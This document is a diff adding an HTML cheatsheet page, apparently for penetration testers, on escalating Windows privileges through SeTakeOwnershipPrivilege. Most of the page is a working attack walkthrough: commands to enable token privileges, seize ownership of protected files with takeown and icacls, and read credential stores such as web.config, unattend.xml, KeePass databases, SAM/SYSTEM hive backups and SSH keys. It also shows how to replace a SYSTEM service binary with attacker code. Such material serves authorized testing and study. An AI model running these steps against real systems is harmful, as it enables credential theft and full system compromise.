@@ -1,0 +1,353 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SeTakeOwnership · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Windows › Privilege Escalation</nav><h1>SeTakeOwnership</h1><p class="cx-lede">File-access escalation via ownership manipulation - SeTakeOwnership grants the right to take ownership of any securable object regardless of its DACL, after which the new owner can grant themselves arbitrary permissions. The workflow is take-ownership → grant-self-full-control → read-the-file, applied to credential-bearing targets like KeePass databases, web.config files, SSH keys, registry hive backups, and password.txt files on shared drives. Comes with the unique operational hazard of being a destructive change that can break legitimate access.</p><div class="cx-tags"><span class="cx-tag">MITRE T1222.001, T1068</span><span class="cx-tag">D3FEND D3-LFP</span><span class="cx-tag">IMPACT PrivEsc, CredentialTheft</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p><code>SeTakeOwnershipPrivilege</code> lets the holder become the owner of any securable object (file, folder, registry key, service, AD object). The owner can modify the object's DACL - so take ownership, grant yourself full control, then read or write the previously-inaccessible target. The privilege is <code>Disabled</code> by default in tokens that hold it; enable it programmatically before using <code>takeown</code>.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Confirm the privilege is held (even if Disabled)
+whoami /priv | findstr TakeOwnership
+
+# Enable all token privileges (including SeTakeOwnership)
+Import-Module .\EnableAllTokenPrivs.ps1
+.\EnableAllTokenPrivs.ps1
+
+# Take ownership of a target file
+takeown /f &quot;C:\Department Shares\Private\IT\cred.txt&quot;
+
+# Grant self full control via DACL
+icacls &quot;C:\Department Shares\Private\IT\cred.txt&quot; /grant USERNAME:F
+
+# Now readable
+cat &quot;C:\Department Shares\Private\IT\cred.txt&quot;</code></pre></figure>
+<p>Success indicator: reading the contents of a file the user couldn't read before. Typical payoff: credentials inside the previously-inaccessible file.</p>
+<h2 id="when-this-applies">When this applies</h2>
+<p><code>SeTakeOwnershipPrivilege</code> is held by Administrators by default. Outside that, it appears on:</p>
+<ul>
+<li><strong>Backup service accounts</strong> - Often granted alongside <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code> to enable backup software to traverse files without full admin rights.</li>
+<li><strong>Specific operational accounts</strong> - Sysadmins create custom accounts with the privilege so application support staff can take ownership of stuck files without granting full admin.</li>
+<li><strong>Misconfigurations</strong> - Granted "temporarily" via local security policy or domain GPO and forgotten.</li>
+</ul>
+<p>The discovery signal:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                                              State
+============================= ======================================================== ========
+SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled</code></pre></figure>
+<p><code>Disabled</code> state is normal. The privilege is held; it just needs activation.</p>
+<h2 id="how-ownership-based-access-works">How ownership-based access works</h2>
+<p>Windows file access decisions follow this logic at the kernel level:</p>
+<ol>
+<li><strong>Is the requester the owner?</strong> Owners always have the implicit right to read the DACL and modify it (<code>WRITE_DAC</code> and <code>READ_CONTROL</code>).</li>
+<li><strong>Does the DACL grant the requested access?</strong> Normal ACL evaluation.</li>
+<li><strong>Deny ACEs override allow ACEs.</strong></li>
+</ol>
+<p>Step 1 is the relevant one. The owner of a file can <em>always</em> modify its DACL, even if the DACL itself denies that owner read access. The privilege escalation pattern exploits this:</p>
+<ol>
+<li>Take ownership (allowed by <code>SeTakeOwnership</code> regardless of current DACL).</li>
+<li>As owner, modify the DACL to grant yourself read access.</li>
+<li>Read the file with the newly-granted access.</li>
+</ol>
+<p>The destructive aspect: original owner loses ownership. Original DACL is altered. Legitimate users of the file may experience access failures. Revert these changes after exploitation if the engagement requires undoing changes.</p>
+<h2 id="enabling-the-privilege">Enabling the privilege</h2>
+<p>The privilege is held but <code>Disabled</code> in the token. Most exploitation tooling does this automatically; for manual operation, use a token-adjustment script.</p>
+<p>The <a href="https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1">EnableAllTokenPrivs.ps1</a> script enables every privilege the current token holds:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">PS&gt; Import-Module .\Enable-Privilege.ps1
+PS&gt; .\EnableAllTokenPrivs.ps1
+PS&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                              State
+============================= ======================================== =======
+SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled</code></pre></figure>
+<p><code>Enabled</code> state means the privilege is active and any privileged operation (like <code>takeown</code>) will use it.</p>
+<h3 id="how-enabling-works-internally">How enabling works internally</h3>
+<p>The script uses <code>AdjustTokenPrivileges</code> API via P/Invoke:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">$privileges = New-Object TOKEN_PRIVILEGES
+$privileges.PrivilegeCount = 1
+$privileges.Privileges[0].Luid = $luid
+$privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
+AdjustTokenPrivileges(...)</code></pre></figure>
+<p>The privilege exists in the token regardless of state - it can be enabled and disabled by the holder. Enable just before use, disable after if operational discipline requires it.</p>
+<h3 id="selective-enabling">Selective enabling</h3>
+<p>If you only want to enable one specific privilege rather than all of them, use a single-privilege variant:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">function Enable-Privilege {
+    param([string]$Privilege)
+    $signature = &#x27;[DllImport(&quot;advapi32.dll&quot;, SetLastError = true)]public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);[DllImport(&quot;advapi32.dll&quot;, ExactSpelling = true, SetLastError = true)]public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);&#x27;
+    # ... implementation
+}
+Enable-Privilege SeTakeOwnershipPrivilege</code></pre></figure>
+<p>Useful when you don't want to enable other privileges (some token-monitoring tools alert on broad enablement patterns).</p>
+<h2 id="the-takeown-icacls-workflow">The takeown + icacls workflow</h2>
+<p>Once the privilege is enabled, two built-in Windows commands accomplish the entire attack: <code>takeown</code> to change ownership, <code>icacls</code> to modify the DACL.</p>
+<h3 id="choosing-the-target">Choosing the target</h3>
+<p>Common target file categories:</p>
+<table>
+<thead>
+<tr>
+<th>Target</th>
+<th>Why</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>cred.txt</code>, <code>passwords.txt</code>, <code>creds.xlsx</code></td>
+<td>Sometimes literally credentials on a share</td>
+</tr>
+<tr>
+<td><code>web.config</code></td>
+<td>IIS configuration, often has database connection strings with passwords</td>
+</tr>
+<tr>
+<td><code>*.kdbx</code></td>
+<td>KeePass password database - extract hash, crack offline</td>
+</tr>
+<tr>
+<td><code>*.config</code></td>
+<td>App config files for various services</td>
+</tr>
+<tr>
+<td>SSH keys</td>
+<td><code>id_rsa</code>, <code>*.ppk</code> (PuTTY)</td>
+</tr>
+<tr>
+<td><code>unattend.xml</code>, <code>sysprep.xml</code></td>
+<td>Windows deployment configs, often plaintext local admin passwords</td>
+</tr>
+<tr>
+<td>Registry hive backups</td>
+<td><code>SAM</code>, <code>SYSTEM</code>, <code>SECURITY</code> files in <code>%WINDIR%\repair\</code> or <code>%WINDIR%\System32\config\</code></td>
+</tr>
+<tr>
+<td>Service binary paths</td>
+<td>If service runs as SYSTEM and the binary is replaceable</td>
+</tr>
+</tbody>
+</table>
+<p>A common real-world example uses a file share <code>C:\Department Shares\Private\IT\cred.txt</code>. This pattern (a department share with a credentials file) is operationally common.</p>
+<h3 id="inspecting-the-target-before-action">Inspecting the target before action</h3>
+<p>Get current state - owner, attributes, ACL:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">PS&gt; Get-ChildItem -Path &#x27;C:\Department Shares\Private\IT\cred.txt&#x27; |
+    Select-Object Fullname, LastWriteTime, Attributes, @{Name=&quot;Owner&quot;; Expression={ (Get-Acl $_.FullName).Owner }}
+
+FullName                                 LastWriteTime         Attributes Owner
+--------                                 -------------         ---------- -----
+C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive</code></pre></figure>
+<p>The empty <code>Owner</code> field is a signal - the current user can't read the object's owner because the ACL doesn't grant <code>READ_CONTROL</code>. Workaround: check the parent directory's ownership:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; cmd /c dir /q &#x27;C:\Department Shares\Private\IT&#x27;
+
+ Directory of C:\Department Shares\Private\IT
+
+06/18/2021  12:22 PM    &lt;DIR&gt;          SRV01\sccm_svc  .
+06/18/2021  12:22 PM    &lt;DIR&gt;          SRV01\sccm_svc  ..
+06/18/2021  12:23 PM                36 ...                    cred.txt</code></pre></figure>
+<p><code>/q</code> shows owner. <code>SRV01\sccm_svc</code> owns the parent directory - a service account, suggesting an automated process maintains this file. Useful context for understanding what you're disrupting if you change ownership.</p>
+<h3 id="taking-ownership">Taking ownership</h3>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; takeown /f &quot;C:\Department Shares\Private\IT\cred.txt&quot;
+
+SUCCESS: The file (or folder): &quot;C:\Department Shares\Private\IT\cred.txt&quot; now owned by user &quot;SRV01\student&quot;.</code></pre></figure>
+<p>The current user is now the file's owner. Confirm:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">PS&gt; Get-ChildItem -Path &#x27;C:\Department Shares\Private\IT\cred.txt&#x27; |
+    Select Name, Directory, @{Name=&quot;Owner&quot;; Expression={(Get-ACL $_.Fullname).Owner}}
+
+Name     Directory                       Owner
+----     ---------                       -----
+cred.txt C:\Department Shares\Private\IT SRV01\student</code></pre></figure>
+<p><code>takeown</code> flags worth knowing:</p>
+<ul>
+<li><code>/f FILE</code> - Target file. Required.</li>
+<li><code>/r</code> - Recurse. Apply to directory contents.</li>
+<li><code>/d N</code> - When recursing, default to <code>Yes</code> or <code>No</code> on prompts (<code>/d Y</code> is the unattended pattern).</li>
+<li><code>/a</code> - Take ownership for the <code>Administrators</code> group rather than the current user.</li>
+</ul>
+<p>For directory operations: <code>takeown /f C:\TargetDir /r /d Y</code>.</p>
+<h3 id="granting-dacl-access">Granting DACL access</h3>
+<p>Ownership alone doesn't grant read - you can modify the DACL as owner, but you need to actually do so:</p>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">PS&gt; cat &#x27;C:\Department Shares\Private\IT\cred.txt&#x27;
+
+cat : Access to the path &#x27;C:\Department Shares\Private\IT\cred.txt&#x27; is denied.</code></pre></figure>
+<p>Still denied because the DACL hasn't been changed. Fix it:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; icacls &#x27;C:\Department Shares\Private\IT\cred.txt&#x27; /grant student:F
+
+processed file: C:\Department Shares\Private\IT\cred.txt
+Successfully processed 1 files; Failed processing 0 files</code></pre></figure>
+<p><code>/grant USERNAME:F</code> adds a Full-Control ACE for the named user. Permission specifiers:</p>
+<ul>
+<li><code>F</code> - Full control</li>
+<li><code>M</code> - Modify (read + write + delete + change permissions)</li>
+<li><code>RX</code> - Read + execute</li>
+<li><code>R</code> - Read only</li>
+<li><code>W</code> - Write only</li>
+</ul>
+<p>For read access, <code>R</code> is enough but <code>F</code> is convenient and gives you the option to modify the file later.</p>
+<h3 id="reading-the-target">Reading the target</h3>
+<figure class="cx-code"><figcaption>powershell</figcaption><pre><code class="language-powershell">PS&gt; cat &#x27;C:\Department Shares\Private\IT\cred.txt&#x27;
+
+NIX01 admin
+
+root:n1X_p0wer_us3er!</code></pre></figure>
+<p>The file is now readable. Contents typically include credentials that can be used for the next pivot - in this example, <code>root:n1X_p0wer_us3er!</code> for a Linux system named NIX01.</p>
+<h2 id="operational-considerations">Operational considerations</h2>
+<h3 id="destructive-nature">Destructive nature</h3>
+<p>This is a <em>destructive</em> technique. The original owner loses ownership. The original DACL is modified. Effects on legitimate use:</p>
+<ul>
+<li>The service account that owned the file may fail to process it next time</li>
+<li>Backup jobs may report errors on this file</li>
+<li>Auditing systems may alert on the ownership change</li>
+<li>Other ACEs (deny rules, group permissions) may interact unexpectedly with your new owner status</li>
+</ul>
+<p>For engagements that require minimal disruption or full restoration after testing:</p>
+<ol>
+<li>Document the original owner and DACL before any change (<code>Get-Acl</code> + save to file)</li>
+<li>Make the changes, read the file</li>
+<li>Restore the original ACL: <code>icacls FILE /setowner ORIGINALOWNER</code> then re-apply the original DACL</li>
+<li>Document the timeline in the engagement notes</li>
+</ol>
+<p>For destructive engagements where stealth matters less than impact: don't bother with restoration; the change is logged anyway.</p>
+<h3 id="audit-trail">Audit trail</h3>
+<p>Ownership changes are logged in the Security event log if <strong>Audit Object Access</strong> is enabled:</p>
+<ul>
+<li>Event 4670 - "Permissions on an object were changed"</li>
+<li>Event 4663 - "An attempt was made to access an object" (with <code>TAKE_OWNERSHIP</code> access)</li>
+<li>Event 4907 - "Auditing settings on object were changed"</li>
+</ul>
+<p>Most environments don't have object-access auditing on for ordinary files (volume is too high). But high-value share locations sometimes do. Check before assuming silence.</p>
+<h3 id="what-happens-if-the-target-has-explicit-deny-aces">What happens if the target has explicit deny ACEs</h3>
+<p><code>SeTakeOwnership</code> works <em>regardless</em> of the target's DACL - but specific DACL configurations interact with this:</p>
+<ul>
+<li><strong>Explicit Deny for <code>BUILTIN\Administrators</code></strong> - Doesn't block <code>SeTakeOwnership</code> since you're not currently an admin reading the file; you're a non-admin taking ownership.</li>
+<li><strong>Explicit Deny for <code>Everyone</code></strong> - Once you take ownership, you may still hit Deny ACEs when reading. Solution: remove the Deny ACE with <code>icacls FILE /remove ...</code>.</li>
+<li><strong>Inherited Deny ACEs from parent</strong> - Inheritance can re-apply Deny rules after you change the file's DACL. Disable inheritance: <code>icacls FILE /inheritance:d</code>.</li>
+</ul>
+<p>The general pattern for stubborn ACLs:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; takeown /f TARGET
+C:\&gt; icacls TARGET /inheritance:d
+C:\&gt; icacls TARGET /grant USERNAME:F
+C:\&gt; icacls TARGET /remove DENYPRINCIPAL</code></pre></figure>
+<h2 id="target-catalog">Target catalog</h2>
+<p>Beyond the simple <code>cred.txt</code> scenario, the privilege opens access to numerous high-value targets.</p>
+<h3 id="service-account-credentials">Service account credentials</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>C:\inetpub\wwwroot\web.config              ← IIS app configuration; SQL connection strings
+C:\inetpub\wwwroot\&lt;app&gt;\appsettings.json  ← .NET Core; API keys, DB strings</code></pre></figure>
+<p>The <code>web.config</code> file often contains <code>&lt;connectionString&gt;</code> elements with database credentials. After taking ownership and granting access:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; findstr /i &quot;password\|connectionstring&quot; C:\inetpub\wwwroot\web.config
+&lt;connectionString&gt;&quot;Server=db01;Database=AppDB;User Id=appuser;Password=SecretP@ss123;&quot;&lt;/connectionString&gt;</code></pre></figure>
+<h3 id="sysprep-unattend-files">Sysprep / unattend files</h3>
+<p>Windows deployment leaves credentials in unattended-install XML files. Common locations:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\System32\Sysprep\sysprep.xml
+C:\Windows\System32\Sysprep\unattend.xml
+C:\unattend.xml</code></pre></figure>
+<p>These XML files contain <code>&lt;AutoLogon&gt;</code> blocks with plaintext or base64-encoded passwords for local admin accounts.</p>
+<h3 id="keepass-and-password-manager-databases">KeePass and password manager databases</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>%USERPROFILE%\Documents\*.kdbx           ← KeePass 2.x database
+%USERPROFILE%\AppData\Local\1Password\*  ← 1Password local cache</code></pre></figure>
+<p>Take ownership, copy off-host, extract the database master-password hash with <code>keepass2john</code>, crack with hashcat mode 13400. See the credential-hunting round for the full chain.</p>
+<h3 id="registry-hive-backups">Registry hive backups</h3>
+<p>Windows keeps backups of registry hives in <code>C:\Windows\repair\</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>C:\Windows\repair\SAM
+C:\Windows\repair\SYSTEM
+C:\Windows\repair\SECURITY</code></pre></figure>
+<p>These are usually outdated (from when the system was installed) but contain the original local administrator hash. Take ownership of <code>SAM</code> and <code>SYSTEM</code>, copy off-host, run <code>secretsdump.py -sam SAM -system SYSTEM LOCAL</code>.</p>
+<p>The live versions at <code>C:\Windows\System32\config\</code> are normally locked but may also be accessible - try <code>reg save HKLM\SAM SAM.SAV</code> first (less destructive than ownership change).</p>
+<h3 id="ssh-keys">SSH keys</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>%USERPROFILE%\.ssh\id_rsa
+%USERPROFILE%\.ssh\id_ecdsa
+%USERPROFILE%\.ssh\config</code></pre></figure>
+<p>Or PuTTY format:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>%USERPROFILE%\*.ppk</code></pre></figure>
+<p>Private keys ferry lateral movement to Linux hosts the user has SSH'd into.</p>
+<h3 id="service-binaries">Service binaries</h3>
+<p>A service runs as SYSTEM with its binary at <code>C:\Program Files\AppX\service.exe</code>. The binary is owned by <code>TrustedInstaller</code> and unwritable by users. With <code>SeTakeOwnership</code>:</p>
+<figure class="cx-code"><figcaption>cmd</figcaption><pre><code class="language-cmd">C:\&gt; takeown /f &quot;C:\Program Files\AppX\service.exe&quot;
+C:\&gt; icacls &quot;C:\Program Files\AppX\service.exe&quot; /grant USERNAME:F
+C:\&gt; copy malicious.exe &quot;C:\Program Files\AppX\service.exe&quot;
+C:\&gt; sc stop AppX &amp;&amp; sc start AppX</code></pre></figure>
+<p>The service restarts running attacker-controlled code as SYSTEM. This is broadly destructive (the legitimate service is gone) but effective.</p>
+<h3 id="group-policy-preferences">Group Policy preferences</h3>
+<p>Domain group policies sometimes embed credentials in XML files in SYSVOL:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>\\domain\SYSVOL\domain\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml</code></pre></figure>
+<p>If <code>SeTakeOwnership</code> extends to file shares (which it can, with appropriate domain rights), these contain <code>cpassword</code> AES-encrypted blobs that can be decrypted offline with public keys. Microsoft published the AES key for this in MSDN, making "GPP password decryption" a one-liner.</p>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Task</th>
+<th>Pattern</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Confirm SeTakeOwnership held</td>
+<td><code>whoami /priv \| findstr TakeOwnership</code></td>
+</tr>
+<tr>
+<td>Enable all held privileges</td>
+<td><code>Import-Module .\EnableAllTokenPrivs.ps1; .\EnableAllTokenPrivs.ps1</code></td>
+</tr>
+<tr>
+<td>Check file ownership</td>
+<td><code>Get-ChildItem PATH \| Select Name, @{Name="Owner";Expression={(Get-Acl $_.FullName).Owner}}</code></td>
+</tr>
+<tr>
+<td>Check parent dir ownership</td>
+<td><code>cmd /c dir /q PATH</code></td>
+</tr>
+<tr>
+<td>Take ownership of file</td>
+<td><code>takeown /f PATH</code></td>
+</tr>
+<tr>
+<td>Take ownership recursively</td>
+<td><code>takeown /f PATH /r /d Y</code></td>
+</tr>
+<tr>
+<td>Take ownership as Administrators</td>
+<td><code>takeown /f PATH /a</code></td>
+</tr>
+<tr>
+<td>Grant self full control</td>
+<td><code>icacls PATH /grant USERNAME:F</code></td>
+</tr>
+<tr>
+<td>Grant self read-only</td>
+<td><code>icacls PATH /grant USERNAME:R</code></td>
+</tr>
+<tr>
+<td>Disable inheritance</td>
+<td><code>icacls PATH /inheritance:d</code></td>
+</tr>
+<tr>
+<td>Remove Deny ACE</td>
+<td><code>icacls PATH /remove:d PRINCIPAL</code></td>
+</tr>
+<tr>
+<td>Restore original owner</td>
+<td><code>icacls PATH /setowner ORIGINALOWNER</code></td>
+</tr>
+<tr>
+<td>Common credential targets</td>
+<td><code>*.kdbx, web.config, unattend.xml, *.ppk, id_rsa, SAM, SYSTEM, *.txt with creds</code></td>
+</tr>
+<tr>
+<td>Detection event IDs</td>
+<td>4670 (permission change), 4663 (object access), 4907 (audit settings)</td>
+</tr>
+<tr>
+<td>Restoration workflow</td>
+<td>Save Get-Acl output → modify → read → restore Acl → restore owner</td>
+</tr>
+</tbody>
+</table>
+<p>For broader file-access scenarios where <code>SeBackupPrivilege</code> is more appropriate (any file regardless of DACL), see <a href="../backup-operators/index.html">Backup Operators</a>. For escalation via process memory rather than files, see <a href="../sedebugprivilege/index.html">SeDebugPrivilege</a>. For token-impersonation, see <a href="../seimpersonate/index.html">SeImpersonate</a>.</p></article><nav class="cx-pager"><a class="cx-prev" href="../sedebugprivilege/index.html">Previous: SeDebugPrivilege</a><a class="cx-next" href="../backup-operators/index.html">Next: Backup Operators</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
